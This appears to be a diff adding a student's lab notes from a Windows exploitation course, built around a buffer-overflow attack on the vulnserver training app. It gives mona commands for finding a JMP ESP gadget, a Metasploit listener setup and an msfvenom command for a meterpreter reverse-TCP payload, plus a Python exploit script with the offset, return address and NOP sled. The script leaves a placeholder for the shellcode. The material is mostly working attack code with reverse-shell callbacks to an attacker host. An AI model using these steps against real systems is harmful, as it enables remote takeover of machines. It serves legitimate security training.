@@ -1,1 +1,44 @@
+https://sec.cybbh.io/public/security/latest/lessons/lesson-9-windows-exploit_sg.html
+https://sec.cybbh.io/-/public/-/jobs/842473/artifacts/slides/09-windows-priv-persist-cover.html
+http://10.50.29.85:8000/
 
+in immunity debug
+!mona modules
+  the dll with no protections
+!mona jmp -r esp -m "essfunc.dll"
+
+
+msfconsole
+msf6 use multi/handler
+msf6 show options
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+msf6 exploit(multi/handler) > exploit
+
+
+VULN SERVER EXP
+
+s.connect(("10.50.45.158",9999)) #connect to target IP and PORT, we will use localhost in challanges as ip /w the port opened in ssh command, windows opstation in demo
+#ssh student@grayhost -L <RHP>:192.168.x.x:9999
+
+#!/usr/bin/python2.7
+import socket
+
+'''
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
+'''
+
+buf = "TRUN /.:/" #Exploit
+buf += "A" * 2003 #Buffer Offset
+buf += "\xa0\x12\x50\x62"  #JMP ESP
+buf += "\x90" * 15 #NOP SLED
+buf += #SHELLCODE HERE from msfvenom
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket
+
+s.connect(("0.0.0.0",PORTHERE))    #IP and port to connect to, from SSH tunnel above
+print s.recv(1024)   #print response
+s.send(buf)       #sends the variable buf
+print s.recv(1024)   #print response
+s.close()         #close the connection
+
+chmod +x <bufferFileName>
